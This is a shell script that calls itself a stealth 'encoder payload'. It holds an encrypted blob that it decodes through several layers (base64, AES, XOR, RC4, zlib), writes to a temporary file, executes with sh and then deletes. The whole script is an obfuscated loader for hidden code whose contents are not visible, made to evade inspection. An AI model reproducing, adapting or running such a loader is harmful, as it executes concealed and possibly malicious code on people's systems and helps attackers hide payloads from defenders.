#!/bin/sh
# Brutal Extreme Encoder Payload - Stealth 1 line
e='0YmN1ETZlJWNmBzMkZGOxgzM0YWZmFmYlNDM2gDNjNTY4MTY3QzYhZmZzQWO5ADZwMGN3QjM1Y2MxUWOkVTOjdDMwITZzkDZzEjNlF2N5U2M5cDZjNWN0YjMhZzYjNWO'
rk='3c08fe966936800121cb4d199ad026ec11195f39f0edabba90aef73d523101b4'
xk='c19cd53c6c90bf886ea37da1bf3be96f'
ak='12ab24ed95c1acb4761f76533cd86eff6c10a793741bb9df5f47abf46767b569'
iv='834222cc04c7610316442af9b7a12429'

decode() {
  python3 -c '
import sys,zlib,base64,hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def rc4(data,key):
  S=list(range(256))
  j=0
  out=bytearray()
  for i in range(256):
    j=(j+S[i]+key[i % len(key)])%256
    S[i],S[j]=S[j],S[i]
  i=j=0
  for c in data:
    i=(i+1)%256
    j=(j+S[i])%256
    S[i],S[j]=S[j],S[i]
    out.append(c ^ S[(S[i]+S[j])%256])
  return bytes(out)

def xor(data,key):
  return bytes([b ^ key[i % len(key)] for i,b in enumerate(data)])

e=sys.argv[1][::-1]
b64=base64.b64decode(e)
hexed=b64.decode()
aesdata=bytes.fromhex(hexed)

key=bytes.fromhex(sys.argv[2])
iv=bytes.fromhex(sys.argv[3])

cipher=AES.new(bytes.fromhex(sys.argv[4]),AES.MODE_CBC,bytes.fromhex(sys.argv[5]))
decrypted=unpad(cipher.decrypt(aesdata),16)

xorkey=bytes.fromhex(sys.argv[6])
rc4key=bytes.fromhex(sys.argv[7])

xored=xor(decrypted,xorkey)
decrypted_final=rc4(xored,rc4key)

decompressed=zlib.decompress(decrypted_final).decode("utf-8")

import tempfile,os,subprocess
f=tempfile.NamedTemporaryFile("w",delete=False)
f.write(decompressed)
f.close()
os.chmod(f.name,0o755)
subprocess.call(["sh",f.name])
os.remove(f.name)
' "$e" "$ak" "$iv" "$ak" "$iv" "$xk" "$rk"
}

decode
